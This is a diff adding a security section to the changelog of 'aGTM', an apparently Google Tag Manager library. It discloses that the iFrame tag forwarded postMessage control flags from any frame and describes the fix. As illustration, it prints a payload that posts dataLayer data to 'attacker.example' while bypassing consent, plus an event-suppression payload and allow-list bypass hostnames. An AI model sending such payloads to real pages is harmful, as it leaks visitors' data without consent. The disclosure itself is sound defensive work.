@@ -20,10 +20,91 @@ Removed data keys: `aGTM.d.session_ready`, `aGTM.d.consent_sent`.
   upgrade, that requirement was never actually met before either.
 - The "aGTM - DL Repeat" tag needs library **1.5+** — against an older library it warns
   and does nothing.
+- **Breaking, "aGTM iFrame Support" tag: an empty hostname allow-list now rejects every
+  message** (it used to accept any http/https origin). If you use that tag, enter your
+  hostnames before publishing — otherwise iFrame events stop arriving. The tag logs one
+  line to the console when this happens.
 - sGTM Client only: the "URL Parameters" column starts working (see below).
 
 The full per-change rationale follows; it is long because it doubles as the design
-record. If you only want to know what to touch, the four points above are it.
+record. If you only want to know what to touch, the points above are it.
+
+### Security — the iFrame Support tag passed control flags from any frame into `fire()`
+
+The "aGTM iFrame Support" tag runs in the **top** frame and copied a foreign
+`postMessage` key by key into the event it hands to `aGTM.f.fire()`. It checked the
+origin hostname and a non-empty `event` name — nothing else. aGTM's own control flags
+went straight through, and the hostname allow-list was **empty by default, which meant
+"accept any http/https origin"**. So any embedded frame — an ad slot, a video embed, a
+chat widget — and any injected script could send:
+
+```js
+{ event: 'evil', _noConsent: true, _noDLPush: true,
+  _post: { url: 'https://attacker.example/collect' } }
+```
+
+Measured with **no consent given at all**: nothing appears in the dataLayer, and the top
+origin sends a `POST` to the attacker's URL — carrying whatever dataLayer variables the
+tag was configured to attach. `_noConsent` defeats the consent gate, `_post` picks the
+recipient, `_noDLPush` hides the whole thing. The counterpart, `{event:'purchase',
+eventModel:{a:1}}`, is the mirror image: `fire()` silently drops any event carrying
+`eventModel` or a numeric `aGTMts`, so a foreign frame could suppress **every** event of
+the page — a measurement blackout with no trace.
+
+The v1.5 hardening of the handshake (F-33) secured the direction iFrame→top. This is the
+other direction, and it was open.
+
+**What changed in the tag:**
+
+- **Control keys are skipped in the merge loop**, not neutralised afterwards: every key
+  with a leading `_`, plus `aGTMts`, `aGTMparams`, `aGTMchk`, `aGTMdl`, `eventModel` and
+  `__proto__`/`constructor`/`prototype`. A namespace rule rather than a list of four
+  names, so a control flag added to the library later cannot quietly re-open the hole.
+  Verified that the fields `iFrameFire` legitimately appends — `aGTM_source`, `ifEvCtr`,
+  `ifEvCtr_<event>` — survive it; a blanket `aGTM` prefix filter on *keys* would have
+  thrown them away.
+- **`_noConsent` is the one exception, behind a new opt-in checkbox** ("Allow
+  `_noConsent` from iFrames", **off by default**). Real aGTM iFrames do put that flag on
+  the wire, and it is a documented way to send functional or legally required events, so
+  removing it outright would have been a silent behaviour change for existing setups.
+  Off by default is safe as shipped; the switch restores the old behaviour without a code
+  change. `_post`/`_post_sent`/`_noDLPush` have no such case and are always stripped.
+- **Event names reserved for the library are rejected** — `aGTM*`, `gtm.*`,
+  `[av]DOMready`, `[av]PAGEready`: exactly the set `iFrameFire` routes locally, so it can
+  never legitimately arrive by `postMessage`. `aGTM*` additionally bypasses the library's
+  consent gate, and `gtm.*` would let a foreign frame fire the built-in GTM triggers. The
+  check runs on the **final** name after prefixing, because the shipped default applies
+  no prefix at all and because an Event Prefix starting with `aGTM` can create such a
+  name in the first place.
+- **Breaking: an empty hostname allow-list is fail-closed.** "Empty accepts everything"
+  is not a default a security check can have. To keep the change diagnosable, the tag
+  gets the `logging` permission back (removed in the F-42 sweep) and writes one console
+  line — once per page, because this listener sees *every* `postMessage` on the page.
+- **Regex allow-list entries are anchored** (`^(?:…)$`) before matching. `aGTM.f.rTest`
+  is unanchored and is shared library code other callers depend on, so the anchoring
+  happens in the tag. Measured before the fix, an entry `shop.example.com` also matched
+  `shop.example.com.attacker.net` and `evilshop.example.com` — the allow-list let more
+  through than it displayed, which is worse than no allow-list. Note that you still have
+  to escape the dots yourself: even anchored, `shop.example.com` matches
+  `shopXexample.com`. The field help now says so.
+- **The additional event parameters are applied after the message**, so they actually
+  overwrite it — as their own help text always claimed. Until now a foreign value won
+  over a configured `traffic_type`/`user_id`.
+- Eleven new `___TESTS___` scenarios cover each of these, including a counter-guard that
+  the legitimate `iFrameFire` fields still pass.
+
+**What this does not fix**, and is deliberately out of scope here: an allow-listed frame
+can still fire any non-reserved event with any payload — the allow-list is the trust
+boundary, the content is not checked. The sender cannot be verified beyond its origin,
+because `aGTM.f.evLstn` passes only `e.data` and `e.origin` to the handler; the sender
+never reaches a template. (The opposite direction *does* verify it — `ifHSlisten` requires
+`e.source === window.top`. That asymmetry needs a library change.) An event name listed in
+`consent_events` also still triggers a consent re-read: control through the name, which no
+key filter can catch.
+
+If you distribute the GTM workspace export rather than the template file, note that the
+copy in `gtm/aGTM-GTM-Workspace-Template-18.json` predates all of this **and** predates
+F-33; it needs to be re-exported from GTM.
 
 ### Fixed — the sGTM Client's "Use env Parameter" switch never did anything
 
